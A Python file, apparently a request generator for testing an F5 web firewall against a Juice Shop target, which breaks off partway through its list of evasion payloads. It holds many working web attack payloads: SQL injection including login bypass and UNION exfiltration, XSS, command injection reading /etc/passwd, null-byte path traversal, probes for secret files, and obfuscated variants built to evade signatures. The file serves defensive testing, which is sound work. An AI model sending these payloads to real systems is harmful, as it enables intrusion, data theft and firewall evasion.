import csv
import io
from urllib.parse import parse_qs, unquote, urlsplit
from flask import Flask, Response, jsonify, request

import argparse
import json
import random
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone

try:
    import requests
except ImportError:
    requests = None


@dataclass
class Pattern:
    label: str
    name: str
    method: str
    path: str
    params: dict = field(default_factory=dict)
    json_body: dict = None
    form_body: dict = None
    note: str = ""
    kind: str = ""
    risk: str = ""
    headers: dict = field(default_factory=dict)
    requires_captcha: bool = False


NORMAL = [
    Pattern("normal", "product_list", "GET", "/api/Products"),
    Pattern("normal", "search_apple", "GET", "/rest/products/search", {"q": "apple"}),
    Pattern("normal", "product_reviews", "GET", "/rest/products/1/reviews"),
    Pattern("normal", "product_reviews_2", "GET", "/rest/products/2/reviews"),
]


BENIGN_REPORTS = [
    Pattern("benign", "feedback_o_reilly_search_error", "POST", "/api/Feedbacks",
            json_body={
                "comment": "The search box returned an error when I searched for O'Reilly's cookbook. The products are great otherwise.",
                "rating": 4,
            },
            note="Natural customer report accepted by the app (HTTP 201). Verify in F5 events whether a signature matched.",
            kind="natural_report", requires_captcha=True),
    Pattern("benign", "feedback_safe_markup", "POST", "/api/Feedbacks",
            json_body={
                "comment": "The help page uses <b>bold</b> around the heading, but it is still hard to read. Could it be larger?",
                "rating": 4,
            },
            note="Natural display feedback accepted by the app (HTTP 201). Verify in F5 events whether a signature matched.",
            kind="natural_report", requires_captcha=True),
    Pattern("benign", "feedback_encoded_download_link", "POST", "/api/Feedbacks",
            json_body={
                "comment": "The download example points to ..%2Fmanual.pdf and returns 404. Is there a current link?",
                "rating": 4,
            },
            note="Natural broken-link report accepted by the app (HTTP 201). Verify in F5 events whether a signature matched.",
            kind="natural_report", requires_captcha=True),
]


SIGNATURE_REPORTS = [
    Pattern("benign", "feedback_sql_union_report", "POST", "/api/Feedbacks",
            json_body={
                "comment": "The search page showed ' UNION SELECT in an error message. Is that expected? The juice is great.",
                "rating": 4,
            },
            note="Benign bug report; current target returned F5 401. Import the event to inspect its signature and risk.",
            kind="signature_report", requires_captcha=True),
    Pattern("benign", "feedback_xss_display_report", "POST", "/api/Feedbacks",
            json_body={
                "comment": "The product help page displays <script> literally. Is that supposed to be visible?",
                "rating": 4,
            },
            note="Benign display report; current target returned F5 401. Import the event to inspect its signature and risk.",
            kind="signature_report", requires_captcha=True),
    Pattern("benign", "feedback_relative_path_report", "POST", "/api/Feedbacks",
            json_body={
                "comment": "The download link ../etc/ from the help page returns a 404. Is there an updated link?",
                "rating": 4,
            },
            note="Benign broken-link report; current target returned F5 401. Import the event to inspect its signature and risk.",
            kind="signature_report", requires_captcha=True),
]


ATTACK = [

    Pattern("attack", "sqli_union_exfil", "GET", "/rest/products/search",
            {"q": "qwert'))UNION SELECT 1,comment,3,4,5,6,7,8,9,10 FROM Feedbacks--"},
            note="SQL Injection: UNION -> bare 200 real exfil of feedback; the protected "
                 "target returned an F5 rejection in the last live run"),

    Pattern("attack", "xss_iframe_review", "PUT", "/rest/products/1/reviews",
            json_body={"message": "<iframe src=\"javascript:alert(`xss`)\">", "author": "s@e.com"},
            note="XSS: fires iframe/src-javascript signatures; the protected target returned "
                 "an F5 rejection in the last live run. Stored on a bare Juice Shop target"),

    Pattern("attack", "path_traversal_nullbyte", "GET",
            "/ftp/package.json.bak%2500.md",
            note="Path traversal: %2500 null byte -> bare Juice Shop leaks package.json.bak; "
                 "the protected target returned an F5 rejection in the last live run"),
]


_MEDIUM_NOTE = ("ML-supported category signature fires; Juice Shop has no sink -> "
                "WAF request-scoring probe. Confirm req_risk in the F5 Security Event.")


MEDIUM = [


    Pattern("attack", "med_server_info", "GET", "/server-info",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_cgi_bin", "GET", "/cgi-bin/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_server_status", "GET", "/server-status",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_manager", "GET", "/manager/html",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_host_manager", "GET", "/host-manager/html",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_jmx_console", "GET", "/jmx-console/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_web_console", "GET", "/web-console/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_axis2", "GET", "/axis2/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_solr", "GET", "/solr/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_jenkins", "GET", "/jenkins/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_console", "GET", "/console/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_actuator", "GET", "/actuator",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_actuator_env", "GET", "/actuator/env",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_metrics", "GET", "/metrics",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_wp_admin", "GET", "/wp-admin/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_wp_login", "GET", "/wp-login.php",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_administrator", "GET", "/administrator/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_admin", "GET", "/admin/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_phpmyadmin", "GET", "/phpMyAdmin/",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_svn", "GET", "/.svn/entries",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_cvs", "GET", "/CVS/Root",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_meta_inf", "GET", "/META-INF/MANIFEST.MF",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_app_etc", "GET", "/app/etc/local.xml",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_conf", "GET", "/conf/server.xml",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_logs", "GET", "/logs/access.log",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_backup_zip", "GET", "/backup.zip",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
^[[3~            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_db_sql", "GET", "/db.sql",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_config_php", "GET", "/config.php",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_env_bak", "GET", "/.env.bak",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
    Pattern("attack", "med_idea", "GET", "/.idea/workspace.xml",
            note="Medium-risk predictable-resource candidate; read req_risk in F5 event.",
            kind="no_sink_probe", risk="medium"),
]


_SWEEP_NOTE = "SWEEP probe to find the Medium req_risk bucket; read req_risk in the F5 event."
SWEEP = [

    Pattern("attack", "sweep_ldap_uid_only", "GET", "/rest/products/search",
            {"q": "(uid=*)"}, note=_SWEEP_NOTE, kind="no_sink_probe", risk="medium"),

    Pattern("attack", "sweep_sqli_quote_comment", "GET", "/rest/products/search",
            {"q": "apple'--"}, note=_SWEEP_NOTE, kind="no_sink_probe", risk="medium"),

    Pattern("attack", "sweep_xss_attr_handler", "GET", "/rest/products/search",
            {"q": "apple\" onmouseover=\"x"}, note=_SWEEP_NOTE, kind="no_sink_probe", risk="medium"),

    Pattern("attack", "sweep_traversal_weak", "GET", "/rest/products/search",
            {"q": "apple../config"}, note=_SWEEP_NOTE, kind="no_sink_probe", risk="medium"),

    Pattern("attack", "sweep_predictable_git", "GET", "/rest/products/search",
            {"q": "apple/.git/config"}, note=_SWEEP_NOTE, kind="no_sink_probe", risk="medium"),

    Pattern("attack", "sweep_ssti_dollar", "GET", "/rest/products/search",
            {"q": "apple${7*7}"}, note=_SWEEP_NOTE, kind="no_sink_probe", risk="medium"),
]


_SWEEP2_NOTE = "SWEEP2: fires a signature at mid strength; read req_risk/accuracy in the F5 event."
SWEEP2 = [
    Pattern("attack", "s2_sqli_or_tautology", "GET", "/rest/products/search",
            {"q": "apple' OR '1'='1"}, note=_SWEEP2_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s2_sqli_numeric_or", "GET", "/rest/products/search",
            {"q": "1 OR 1=1"}, note=_SWEEP2_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s2_xss_img_onerror", "GET", "/rest/products/search",
            {"q": "<img src=x onerror=alert(1)>"}, note=_SWEEP2_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s2_cmd_etc_hosts", "GET", "/rest/products/search",
            {"q": "apple;cat /etc/hosts"}, note=_SWEEP2_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s2_traversal_etc", "GET", "/rest/products/search",
            {"q": "apple../etc/"}, note=_SWEEP2_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s2_ldap_generic", "GET", "/rest/products/search",
            {"q": "apple)(cn=*)"}, note=_SWEEP2_NOTE, kind="no_sink_probe", risk="medium"),
]


_SWEEP3_NOTE = "SWEEP3 non-ML path probe; req_risk should be the signature rating (hunting Medium)."
SWEEP3 = [
    Pattern("attack", "s3_dotenv", "GET", "/.env", note=_SWEEP3_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s3_git_config", "GET", "/.git/config", note=_SWEEP3_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s3_web_config", "GET", "/web.config", note=_SWEEP3_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s3_server_status", "GET", "/server-status", note=_SWEEP3_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s3_htpasswd", "GET", "/.htpasswd", note=_SWEEP3_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s3_webinf", "GET", "/WEB-INF/web.xml", note=_SWEEP3_NOTE, kind="no_sink_probe", risk="medium"),
]


_SWEEP4_NOTE = "SWEEP4: hunting req_risk=medium (Medium sig, no AI confirm); read req_risk in the event."
SWEEP4 = [
    Pattern("attack", "s4_server_info_q", "GET", "/server-info?view=all", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_status_full", "GET", "/status", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_cgi_bin", "GET", "/cgi-bin/", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_manual", "GET", "/manual/", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_phpmyadmin", "GET", "/phpmyadmin/", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_info_php", "GET", "/info.php", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_test_php", "GET", "/test.php", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_dsstore", "GET", "/.DS_Store", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_sitemap", "GET", "/sitemap.xml", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
    Pattern("attack", "s4_icons_readme", "GET", "/icons/README", note=_SWEEP4_NOTE, kind="no_sink_probe", risk="medium"),
]


ALLSIG = [

    Pattern("attack", "sig_sqli_union", "GET", "/rest/products/search",
            {"q": "qwert'))UNION SELECT 1,comment,3,4,5,6,7,8,9,10 FROM Feedbacks--"},
            note="SQLi UNION exfil -> req_risk=high (AI confirmed).", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_sqli_or", "GET", "/rest/products/search",
            {"q": "apple' OR '1'='1"}, note="SQLi tautology -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_xss_iframe", "PUT", "/rest/products/1/reviews",
            json_body={"message": "<iframe src=\"javascript:alert(`xss`)\">", "author": "s@e.com"},
            note="XSS iframe/js -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_xss_img_onerror", "GET", "/rest/products/search",
            {"q": "<img src=x onerror=alert(1)>"}, note="XSS img onerror -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_xss_attr", "GET", "/rest/products/search",
            {"q": "apple\" onmouseover=\"x"}, note="XSS attr handler -> blocked (high).", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_cmd_passwd", "GET", "/rest/products/search",
            {"q": "apple;cat /etc/passwd"}, note="CmdExec + /etc/passwd predictable -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_cmd_hosts", "GET", "/rest/products/search",
            {"q": "apple;cat /etc/hosts"}, note="CmdExec /etc/hosts -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_ssci_php", "GET", "/rest/products/search",
            {"q": "apple<?php system('id');?>"}, note="SSCI system() -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_ldap_generic", "GET", "/rest/products/search",
            {"q": "*)(uid=*))(|(uid=*"}, note="LDAP generic (200005012 High) -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_path_nullbyte", "GET", "/ftp/package.json.bak%2500.md",
            note="Path traversal null byte -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_path_etc", "GET", "/rest/products/search",
            {"q": "apple../etc/"}, note="Path traversal ../etc/ -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_dotenv", "GET", "/.env",
            note="Info leak /.env (200009283 Low sig, AI confirmed) -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_git_config", "GET", "/.git/config",
            note="Predictable /.git/ (200010136 High) -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_htpasswd", "GET", "/.htpasswd",
            note="Info leak /.htpasswd (200100007 High) -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_web_config", "GET", "/web.config",
            note="Predictable web.config (200000041 Medium sig) + forceful browsing -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_server_status", "GET", "/server-status",
            note="Predictable server-status (200100018 Medium sig, AI confirmed) -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_webinf", "GET", "/WEB-INF/web.xml",
            note="Predictable WEB-INF (200010178 Medium sig, AI confirmed) -> req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "sig_phpinfo", "GET", "/phpinfo.php",
            note="Predictable phpinfo -> fired+blocked; req_risk not yet exported.", kind="no_sink_probe", risk="unknown"),

    Pattern("attack", "sig_server_info", "GET", "/server-info",
            note="Predictable server-info (200100019 Medium) -> VERIFIED req_risk=medium.", kind="no_sink_probe", risk="medium"),
    Pattern("attack", "sig_cgi_bin", "GET", "/cgi-bin/",
            note="Predictable /cgi-bin/ (200100033 Medium) -> VERIFIED req_risk=medium.", kind="no_sink_probe", risk="medium"),
]

HIGH = [

    Pattern("attack", "hi_sqli_union", "GET", "/rest/products/search",
            {"q": "qwert'))UNION SELECT 1,comment,3,4,5,6,7,8,9,10 FROM Feedbacks--"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_sqli_or", "GET", "/rest/products/search",
            {"q": "apple' OR '1'='1"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_sqli_numeric", "GET", "/rest/products/search",
            {"q": "1 OR 1=1"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_sqli_sleep", "GET", "/rest/products/search",
            {"q": "apple' AND SLEEP(5)-- "}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_xss_img", "GET", "/rest/products/search",
            {"q": "<img src=x onerror=alert(1)>"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_xss_svg", "GET", "/rest/products/search",
            {"q": "<svg/onload=alert(1)>"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_xss_attr", "GET", "/rest/products/search",
            {"q": "apple\" onmouseover=\"x"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_cmd_passwd", "GET", "/rest/products/search",
            {"q": "apple;cat /etc/passwd"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_cmd_hosts", "GET", "/rest/products/search",
            {"q": "apple;cat /etc/hosts"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_cmd_id_backtick", "GET", "/rest/products/search",
            {"q": "apple`id`"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_ssci_php", "GET", "/rest/products/search",
            {"q": "apple<?php system('id');?>"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_ssci_eval", "GET", "/rest/products/search",
            {"q": "apple';eval('1');'"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_ldap_generic", "GET", "/rest/products/search",
            {"q": "*)(uid=*))(|(uid=*"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_path_etc", "GET", "/rest/products/search",
            {"q": "apple../etc/"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_path_dotdot", "GET", "/rest/products/search",
            {"q": "../../../../etc/passwd"}, note="HIGH injection; req_risk=high.", kind="no_sink_probe", risk="high"),

    Pattern("attack", "hi_path_nullbyte", "GET", "/ftp/package.json.bak%2500.md",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_dotenv", "GET", "/.env",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_git_config", "GET", "/.git/config",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_htpasswd", "GET", "/.htpasswd",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_web_config", "GET", "/web.config",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_webinf", "GET", "/WEB-INF/web.xml",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_svn_entries", "GET", "/.svn/entries",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_meta_inf", "GET", "/META-INF/MANIFEST.MF",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_logs_access", "GET", "/logs/access.log",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_env_bak", "GET", "/.env.bak",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_idea_ws", "GET", "/.idea/workspace.xml",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_jmx_console", "GET", "/jmx-console/",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
    Pattern("attack", "hi_phpinfo", "GET", "/phpinfo.php",
            note="HIGH predictable/info path; req_risk=high.", kind="no_sink_probe", risk="high"),
]


JUICE = [

    Pattern("attack", "juice_sqli_login", "POST", "/rest/user/login",
            json_body={"email": "' OR 1=1--", "password": "x"},
            note="Juice Shop SQLi login bypass (admin JWT on bare target).", kind="juice_vuln", risk="high"),

    Pattern("attack", "juice_sqli_union", "GET", "/rest/products/search",
            {"q": "qwert'))UNION SELECT 1,comment,3,4,5,6,7,8,9,10 FROM Feedbacks--"},
            note="Juice Shop SQLi UNION feedback exfil.", kind="juice_vuln", risk="high"),

    Pattern("attack", "juice_xss_search", "GET", "/rest/products/search",
            {"q": "<iframe src=\"javascript:alert(`xss`)\">"},
            note="Juice Shop DOM XSS search iframe.", kind="juice_vuln", risk="high"),

    Pattern("attack", "juice_xss_stored_review", "PUT", "/rest/products/1/reviews",
            json_body={"message": "<iframe src=\"javascript:alert(`xss`)\">", "author": "s@e.com"},
            note="Juice Shop stored XSS in product review.", kind="juice_vuln", risk="high"),

    Pattern("attack", "juice_xss_track_order", "GET",
            "/rest/track-order/<iframe src=\"javascript:alert(`xss`)\">",
            note="Juice Shop reflected XSS in track-order id.", kind="juice_vuln", risk="high"),

    Pattern("attack", "juice_traversal_pkg", "GET", "/ftp/package.json.bak%2500.md",
            note="Juice Shop /ftp null-byte traversal -> package.json.bak.", kind="juice_vuln", risk="high"),

    Pattern("attack", "juice_traversal_coupons", "GET", "/ftp/coupons_2013.md.bak%2500.md",
            note="Juice Shop /ftp null-byte traversal -> coupons file.", kind="juice_vuln", risk="high"),
]

HIGH20 = [
    Pattern("attack","h20_sqli_union","GET","/rest/products/search",{"q":"qwert'))UNION SELECT 1,comment,3,4,5,6,7,8,9,10 FROM Feedbacks--"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_sqli_or","GET","/rest/products/search",{"q":"apple' OR '1'='1"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_sqli_numeric","GET","/rest/products/search",{"q":"1 OR 1=1"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_sqli_sleep","GET","/rest/products/search",{"q":"apple' AND SLEEP(5)-- "},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_sqli_stacked","GET","/rest/products/search",{"q":"apple';DROP TABLE x--"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_xss_img","GET","/rest/products/search",{"q":"<img src=x onerror=alert(1)>"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_xss_svg","GET","/rest/products/search",{"q":"<svg/onload=alert(1)>"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_xss_script","GET","/rest/products/search",{"q":"<script>alert(1)</script>"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_xss_attr","GET","/rest/products/search",{"q":"apple\" onmouseover=\"x"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_cmd_passwd","GET","/rest/products/search",{"q":"apple;cat /etc/passwd"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_cmd_hosts","GET","/rest/products/search",{"q":"apple;cat /etc/hosts"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_ssci_php","GET","/rest/products/search",{"q":"apple<?php system('id');?>"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_ldap_generic","GET","/rest/products/search",{"q":"*)(uid=*))(|(uid=*"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_path_etc","GET","/rest/products/search",{"q":"apple../etc/"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_path_dotdot","GET","/rest/products/search",{"q":"../../../../etc/passwd"},note="HIGH; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_path_nullbyte","GET","/ftp/package.json.bak%2500.md",note="HIGH predictable/info path; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_dotenv","GET","/.env",note="HIGH predictable/info path; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_git_config","GET","/.git/config",note="HIGH predictable/info path; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_htpasswd","GET","/.htpasswd",note="HIGH predictable/info path; req_risk=high.",kind="sig_probe",risk="high"),
    Pattern("attack","h20_web_config","GET","/web.config",note="HIGH predictable/info path; req_risk=high.",kind="sig_probe",risk="high"),
]
MEDIUM20 = [
    Pattern("attack","m20_server_info","GET","/server-info",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_cgi_bin","GET","/cgi-bin/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_server_info_q","GET","/server-info?view=all",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_icons","GET","/icons/README",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_manual","GET","/manual/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_perl","GET","/perl/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_cgi_sys","GET","/cgi-sys/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_servlet","GET","/servlet/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_soap","GET","/soap/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_axis","GET","/axis/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_jsp_examples","GET","/jsp-examples/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_servlets_examples","GET","/servlets-examples/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_tomcat_docs","GET","/tomcat-docs/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_webdav","GET","/webdav/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_balancer_manager","GET","/balancer-manager",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_jkstatus","GET","/jkstatus",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_mod_status","GET","/mod_status",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_vti_bin","GET","/_vti_bin/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_printers","GET","/printers/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
    Pattern("attack","m20_pls","GET","/pls/",note="Medium-risk predictable-resource candidate; read req_risk in event.",kind="sig_probe",risk="medium"),
]
EVADE = [


    Pattern("attack","ev_sqli_comment","GET","/rest/products/search",
            {"q":"apple'/**/oR/**/'1'/**/=/**/'1"},
            note="SQLi with /**/ comment+case obfuscation to dodge UNION/OR signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_sqli_newline","GET","/rest/products/search",
            {"q":"apple'\nUniON\nSELeCT\n1,2,3--"},
            note="SQLi keyword split by newlines + mixed case. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_xss_backtick","GET","/rest/products/search",
            {"q":"<img src=x oNErRor=prompt`1`>"},
            note="XSS with case-varied handler + backtick call, no classic <script>. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_cmd_ifs","GET","/rest/products/search",
            {"q":"apple;c''at$IFS/etc/passwd"},
